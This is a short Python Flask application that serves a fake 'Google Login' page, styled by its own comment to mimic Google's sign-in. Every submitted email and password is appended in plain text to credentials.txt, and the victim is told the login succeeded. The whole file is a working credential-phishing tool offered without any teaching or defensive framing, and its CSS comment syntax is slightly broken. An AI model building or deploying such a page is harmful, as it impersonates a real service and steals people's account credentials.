from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with open('credentials.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')

        return 'Login successful!'
    
    return '''
    <html>
    <head>
        <title>Google Login</title>
        <style>
            /

*CSS styles to mimic the Google login page*

/
            /*Add your own styling as needed*/
            body {
                font-family: Arial, sans-serif;
            }
            .container {
                width: 300px;
                margin: 0 auto;
                padding-top: 100px;
            }
            input[type="email"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 15px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 10px;
                background-color: #4285F4;
                color: #fff;
                border: none;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <form method="POST" action="/">
                <input type="email" name="username" placeholder="Email" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <input type="submit" value="Sign In">
            </form>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run()
